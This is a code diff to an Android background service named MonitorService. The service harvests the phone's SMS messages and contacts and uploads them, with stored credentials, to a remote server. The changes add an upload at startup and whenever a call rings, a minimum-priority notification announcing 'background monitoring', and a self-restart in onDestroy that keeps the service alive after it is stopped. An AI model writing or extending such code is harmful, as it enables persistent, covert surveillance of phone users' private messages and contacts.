@@ -1,6 +1,8 @@
 package monitor.mobie.hdy.im.service;
 
 import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -19,6 +21,7 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.app.NotificationCompat;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 
@@ -33,13 +36,13 @@ import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import monitor.mobie.hdy.im.R;
 import monitor.mobie.hdy.im.model.ContactMessage;
 import monitor.mobie.hdy.im.model.ContactMessageDetail;
 import monitor.mobie.hdy.im.model.Message;
 import monitor.mobie.hdy.im.model.MessageDetail;
 import monitor.mobie.hdy.im.model.Mobile;
 import monitor.mobie.hdy.im.model.Reply;
-import monitor.mobie.hdy.im.serviceimpl.MonitorBinder;
 import monitor.mobie.hdy.im.utils.Constants;
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -61,19 +64,29 @@ public class MonitorService extends Service {
             = MediaType.parse("application/json; charset=utf-8");
     private TimerTask task;
     private final Timer timer = new Timer();
+    private static String phone;
 
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
-        return new MonitorBinder(MonitorService.this);
+        return null;
     }
 
     @Override
     public void onCreate() {
+        System.out.println("服务创建");
+        SharedPreferences data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
+        phone = data.getString("phone", null);
         super.onCreate();
         openDialReciver();
         openSmsReciver();
         startTimer();
+        startForeground(this);
+        try {
+            uploadAll(null);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     /**
@@ -91,10 +104,30 @@ public class MonitorService extends Service {
         timer.schedule(task, 2000, 1000 * 60 * 5);
     }
 
+    @Override
+    public void onDestroy() {
+        Intent intent = new Intent(MonitorService.this, MonitorService.class);
+        startService(intent);
+        stopForeground(true);
+        super.onDestroy();
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return super.onStartCommand(intent, flags, startId);
+    }
+
+    public static void startForeground(Service context) {
+        NotificationManager nm = (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);
+        NotificationCompat.Builder builder = new NotificationCompat.Builder(context);
+        builder.setContentTitle("后台监控" + phone + "中...")
+                .setContentText("")
+                .setWhen(System.currentTimeMillis())
+                .setPriority(Notification.PRIORITY_MIN)
+                .setSmallIcon(R.drawable.ic_launcher)
+                .setAutoCancel(true);
+        Notification notification = builder.build();
+        context.startForeground(8888, notification);
     }
 
     /**
@@ -112,9 +145,9 @@ public class MonitorService extends Service {
         Mobile mobile = new Mobile();
         mobile.setContactMessage(getContactMessage());
         mobile.setMessage(getSMSData());
-        final SharedPreferences data = getSharedPreferences("data", Context.MODE_PRIVATE);
+        final SharedPreferences data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
         FormBody formBody = new FormBody.Builder()
-                .add("json", com.alibaba.fastjson.JSON.toJSONString(mobile)).add("username", data.getString("phone", "")).add("password", data.getString("password", "")).build();
+                .add("json", com.alibaba.fastjson.JSON.toJSONString(mobile)).add("username", data.getString("phone", null)).add("password", data.getString("password", null)).build();
         Request request = new Request.Builder()
                 .url(Constants.URL + "/upload")
                 .post(formBody)
@@ -194,6 +227,7 @@ public class MonitorService extends Service {
                     break;
                 case TelephonyManager.CALL_STATE_RINGING:// 响铃状态
                     System.out.println("电话正在接听");
+                    update();
                     break;
                 default:
                     break;
@@ -222,8 +256,11 @@ public class MonitorService extends Service {
         Message message = new Message();
         LinkedList<MessageDetail> details = new LinkedList<MessageDetail>();
         Uri uri = null;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             uri = Uri.parse(String.valueOf(Telephony.Sms.CONTENT_URI));
+            System.out.println("权限");
+        } else {
+            return null;
         }
         Cursor cursor = cr.query(uri, null, null, null, null);
         while (cursor.moveToNext()) {
